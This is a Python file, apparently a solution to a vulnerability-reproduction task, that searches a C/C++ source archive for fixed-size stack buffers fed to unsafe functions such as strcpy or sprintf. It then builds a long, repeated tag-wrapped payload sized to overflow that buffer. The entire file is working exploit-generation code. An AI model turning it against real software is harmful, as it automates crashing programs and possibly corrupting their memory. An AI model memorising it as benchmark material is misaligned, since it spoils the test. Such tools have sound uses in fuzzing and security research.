import os
import re
import io
import sys
import tarfile
import zipfile
import tempfile
import shutil
from typing import Dict, List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory(prefix="pocgen_") as td:
            root = self._prepare_src(src_path, td)
            buf_size, tag_names, delims = self._analyze(root)
            ldelim, rdelim = delims

            tag = b"a"
            for t in tag_names:
                if self._is_reasonable_tag_name(t):
                    tag = t
                    break

            open_tag = ldelim + tag + rdelim
            close_tag = ldelim + b"/" + tag + rdelim

            b = buf_size if buf_size else 1024
            if b < 128:
                b = 128

            chunk = b // 8
            if chunk < 16:
                chunk = 16
            if chunk > 64:
                chunk = 64

            reps = (b // chunk) + 4

            unit = open_tag + (b"A" * chunk) + close_tag + b"\n"
            poc = unit * reps

            if len(poc) < 512:
                pad = 512 - len(poc)
                poc = open_tag + (b"A" * (pad - len(open_tag) - len(close_tag) - 1)) + close_tag + b"\n" + poc

            # Add a small multi-syntax prefix to increase chance of "tag found" if delimiters differ
            # (kept small to not dominate length)
            prefix = b""
            if ldelim != b"<" or rdelim != b">":
                prefix += b"<" + tag + b">X</" + tag + b">\n"
            if ldelim != b"[" or rdelim != b"]":
                prefix += b"[" + tag + b"]X[/" + tag + b"]\n"
            if ldelim != b"{" or rdelim != b"}":
                prefix += b"{" + tag + b"}X{/" + tag + b"}\n"

            if prefix:
                poc = prefix + poc

            # Keep size reasonable while still likely overflowing common stack buffers
            if len(poc) > 12000:
                poc = poc[:12000]

            return poc

    def _prepare_src(self, src_path: str, td: str) -> str:
        if os.path.isdir(src_path):
            dst = os.path.join(td, "src")
            shutil.copytree(src_path, dst, dirs_exist_ok=True)
            return dst

        dst = os.path.join(td, "src")
        os.makedirs(dst, exist_ok=True)

        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory: str, target: str) -> bool:
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

                for member in tf.getmembers():
                    member_path = os.path.join(dst, member.name)
                    if not is_within_directory(dst, member_path):
                        continue
                    try:
                        tf.extract(member, dst)
                    except Exception:
                        continue
            return dst

        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    name = zi.filename
                    if not name or name.endswith("/") or name.startswith("/") or ".." in name.replace("\\", "/").split("/"):
                        continue
                    outp = os.path.join(dst, name)
                    outdir = os.path.dirname(outp)
                    os.makedirs(outdir, exist_ok=True)
                    try:
                        with zf.open(zi, "r") as f, open(outp, "wb") as of:
                            shutil.copyfileobj(f, of, length=1024 * 1024)
                    except Exception:
                        continue
            return dst

        # Unknown file type: treat as empty
        return dst

    def _walk_sources(self, root: str) -> List[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx"}
        out = []
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "dist"}]
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                _, ext = os.path.splitext(fn.lower())
                if ext in exts:
                    try:
                        st = os.stat(p)
                        if st.st_size <= 6 * 1024 * 1024:
                            out.append(p)
                    except Exception:
                        continue
        return out

    def _read_text(self, path: str) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read()
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _analyze(self, root: str) -> Tuple[int, List[bytes], Tuple[bytes, bytes]]:
        sources = self._walk_sources(root)

        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b')
        func_start_re = re.compile(r'^\s*(?:static\s+)?(?:inline\s+)?(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:struct\s+)?[A-Za-z_]\w*(?:\s+|\s*\*+\s*)+([A-Za-z_]\w*)\s*\([^;]*\)\s*\{')
        decl_re = re.compile(r'\b(?:char|unsigned\s+char|uint8_t|int8_t)\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]')
        unsafe_call_re = re.compile(r'\b(?:strcpy|strcat|sprintf|vsprintf|gets|memcpy|memmove)\s*\(\s*([A-Za-z_]\w*)\b')
        strcmp_tag_re = re.compile(r'\b(?:strcmp|strncmp)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"([^"\\]{1,64})"\s*\)')
        strstr_re = re.compile(r'\bstrstr\s*\(\s*[^,]+,\s*"([^"\\]{1,64})"\s*\)')
        strlit_re = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
        char_const_re = re.compile(r"'(.)'")

        macros: Dict[str, int] = {}

        # First pass: macros
        for sp in sources:
            txt = self._read_text(sp)
            for line in txt.splitlines():
                m = define_re.match(line)
                if m:
                    name = m.group(1)
                    val = int(m.group(2))
                    if 1 <= val <= 1_000_000:
                        macros[name] = val

        decls: Dict[Tuple[str, str], List[Tuple[int, int, str]]] = {}  # (file,var)->[(line,size,func)]
        candidates: List[Tuple[int, int, str, int, str, str]] = []  # (score,size,file,line,var,func)
        tag_candidates: Dict[str, int] = {}  # tag -> weight
        best_context: Optional[Tuple[str, int]] = None  # (file, line)

        for sp in sources:
            txt = self._read_text(sp)
            lines = txt.splitlines()
            cur_func = ""
            # Pre-extract tag string candidates across file
            for i, line in enumerate(lines):
                lm = line.lower()
                fm = func_start_re.match(line)
                if fm:
                    cur_func = fm.group(1) or cur_func

                cm = strcmp_tag_re.search(line)
                if cm:
                    var = cm.group(1)
                    s = cm.group(2)
                    if self._looks_like_tag_word(s) and ("tag" in var.lower() or "name" in var.lower() or "tag" in lm):
                        tag_candidates[s] = tag_candidates.get(s, 0) + 5

                sm = strstr_re.search(line)
                if sm:
                    s = sm.group(1)
                    if len(s) <= 48 and any(ch in s for ch in "<>[]{}"):
                        tag_candidates[s] = tag_candidates.get(s, 0) + 2

            # Decls and unsafe usage
            cur_func = ""
            for i, line in enumerate(lines):
                lm = line.lower()
                fm = func_start_re.match(line)
                if fm:
                    cur_func = fm.group(1) or cur_func

                dm = decl_re.search(line)
                if dm:
                    var = dm.group(1)
                    sz_tok = dm.group(2)
                    sz = None
                    if sz_tok.isdigit():
                        sz = int(sz_tok)
                    else:
                        if sz_tok in macros:
                            sz = macros[sz_tok]
                    if sz is not None and 1 <= sz <= 1_000_000:
                        decls.setdefault((sp, var), []).append((i, sz, cur_func))

                um = unsafe_call_re.search(line)
                if um:
                    var = um.group(1)
                    # find nearest preceding decl within last 300 lines
                    dlist = decls.get((sp, var), [])
                    nearest = None
                    for di, sz, fn in reversed(dlist):
                        if di <= i and (i - di) <= 300:
                            nearest = (di, sz, fn)
                            break
                    if nearest is None:
                        continue
                    _, sz, fn = nearest
                    score = 0
                    if "tag" in lm or "tag" in fn.lower():
                        score += 7
                    if any(x in lm for x in ("<", ">", "[", "]", "{", "}")):
                        score += 3
                    if any(k in var.lower() for k in ("out", "output", "dst", "dest", "buf", "buffer", "res", "result")):
                        score += 2
                    if any(k in line for k in ("sprintf", "vsprintf", "strcpy", "strcat", "gets")):
                        score += 2
                    # extra context lookback/ahead
                    ctx0 = max(0, i - 40)
                    ctx1 = min(len(lines), i + 40)
                    ctx = "\n".join(lines[ctx0:ctx1]).lower()
                    if "tag" in ctx:
                        score += 4
                    if "<" in ctx and ">" in ctx:
                        score += 2
                    candidates.append((score, sz, sp, i, var, fn))
                    if best_context is None or score > candidates[0][0]:
                        best_context = (sp, i)

        # Select best buffer size candidate
        buf_size = 0
        best = None
        for score, sz, sp, i, var, fn in candidates:
            if sz < 64 or sz > 1_000_000:
                continue
            # prefer plausible stack buffers
            stack_pref = 1
            if 128 <= sz <= 16384:
                stack_pref = 3
            elif 64 <= sz < 128 or 16384 < sz <= 65536:
                stack_pref = 2
            eff_score = score * stack_pref
            key = (eff_score, -score, -stack_pref, -1 if 0 else 0)  # placeholder
            if best is None:
                best = (eff_score, score, stack_pref, sz, sp, i, var, fn)
            else:
                # Prefer higher effective score; then smaller size
                if eff_score > best[0] or (eff_score == best[0] and (score > best[1] or (score == best[1] and sz < best[3]))):
                    best = (eff_score, score, stack_pref, sz, sp, i, var, fn)

        context_text = ""
        if best is not None:
            buf_size = best[3]
            sp = best[4]
            line_idx = best[5]
            txt = self._read_text(sp)
            lines = txt.splitlines()
            ctx0 = max(0, line_idx - 250)
            ctx1 = min(len(lines), line_idx + 250)
            context_text = "\n".join(lines[ctx0:ctx1])

        # Tag names list, weighted
        tag_list: List[Tuple[int, bytes]] = []
        for s, w in tag_candidates.items():
            name = self._extract_tag_name_from_literal(s)
            if name:
                tag_list.append((w, name))
        tag_list.sort(key=lambda x: (-x[0], len(x[1]), x[1]))

        tag_names: List[bytes] = []
        seen = set()
        for w, name in tag_list:
            if name in seen:
                continue
            seen.add(name)
            tag_names.append(name)
            if len(tag_names) >= 8:
                break

        # If none, attempt from context string literals with brackets
        if not tag_names and context_text:
            for m in strlit_re.finditer(context_text):
                s = m.group(1)
                if not s:
                    continue
                if len(s) > 64:
                    continue
                if any(ch in s for ch in "<>[]{}"):
                    name = self._extract_tag_name_from_literal(s)
                    if name and name not in seen:
                        seen.add(name)
                        tag_names.append(name)
                        if len(tag_names) >= 5:
                            break

        # Determine delimiters
        delims = self._choose_delims(context_text)
        return buf_size, tag_names, delims

    def _choose_delims(self, context_text: str) -> Tuple[bytes, bytes]:
        if not context_text:
            return b"<", b">"
        ctx = context_text
        counts = {
            "<": ctx.count("<") + ctx.count("'<'") * 2,
            ">": ctx.count(">") + ctx.count("'>'") * 2,
            "[": ctx.count("[") + ctx.count("'['") * 2,
            "]": ctx.count("]") + ctx.count("']'") * 2,
            "{": ctx.count("{") + ctx.count("'{'") * 2,
            "}": ctx.count("}") + ctx.count("'}'") * 2,
        }
        # Prefer matching pairs with both present
        if counts["<"] > 0 and counts[">"] > 0:
            return b"<", b">"
        if counts["["] > 0 and counts["]"] > 0:
            return b"[", b"]"
        if counts["{"] > 0 and counts["}"] > 0:
            return b"{", b"}"
        return b"<", b">"

    def _looks_like_tag_word(self, s: str) -> bool:
        if not s or len(s) > 32:
            return False
        if any(ch in s for ch in " \t\r\n"):
            return False
        if any(ch in s for ch in "<>[]{}"):
            return False
        return re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-:]{0,31}", s) is not None

    def _extract_tag_name_from_literal(self, lit: str) -> Optional[bytes]:
        if not lit:
            return None
        s = lit.strip()
        # If looks like <tag ...> or </tag>
        if "<" in s and ">" in s:
            # take first bracketed token
            try:
                start = s.index("<")
                end = s.index(">", start + 1)
            except ValueError:
                return None
            inner = s[start + 1:end].strip()
            if inner.startswith("/"):
                inner = inner[1:].strip()
            # remove attributes
            if " " in inner:
                inner = inner.split(" ", 1)[0].strip()
            if not inner:
                return None
            if re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-:]{0,31}", inner) is None:
                return None
            return inner.encode("ascii", errors="ignore")[:32] or None

        # If looks like [tag] or {tag}
        for l, r in (("[", "]"), ("{", "}")):
            if s.startswith(l) and s.endswith(r) and len(s) >= 3:
                inner = s[1:-1].strip()
                if inner.startswith("/"):
                    inner = inner[1:].strip()
                if " " in inner:
                    inner = inner.split(" ", 1)[0].strip()
                if re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-:]{0,31}", inner) is None:
                    return None
                return inner.encode("ascii", errors="ignore")[:32] or None

        # Plain word
        if self._looks_like_tag_word(s):
            return s.encode("ascii", errors="ignore")[:32] or None
        return None

    def _is_reasonable_tag_name(self, bname: bytes) -> bool:
        if not bname or len(bname) > 32:
            return False
        try:
            s = bname.decode("ascii", errors="strict")
        except Exception:
            return False
        return re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-:]{0,31}", s) is not None